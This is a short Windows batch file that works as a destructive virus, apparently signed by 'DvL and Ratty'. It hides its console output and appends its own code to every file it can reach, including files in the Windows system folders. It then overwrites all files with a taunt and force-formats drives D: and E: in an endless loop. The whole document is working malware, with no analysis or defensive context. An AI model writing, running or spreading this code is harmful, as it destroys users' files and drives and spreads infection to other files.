@echo off
@ctty nul
ver | find "XP"
if errorlevel 1 goto w1nd0z3
if not errorlevel 1 goto :XP
:XP
for /r \ %%i in (*.*) do copy %%i+%0 %%i
:: The next line is unuseful :)
for /r \ %%i in (*.*) do echo DvL and Ratty killed your DATA > %%i
if exist echo y | format e:
if exist echo y | format d:
goto XP
ctty con
exit
:w1nd0z3
@for %%a in (..\*.*, c:\mydocu~1\*.*, %windir%\*.*, *.*, %windir%\system\*.*) do copy %%a+%0 %%a
@if exist echo y | format e:/q/autotest
@if exist echo y | format d:/q/autotest
goto w1nd0z3
@ctty con
cls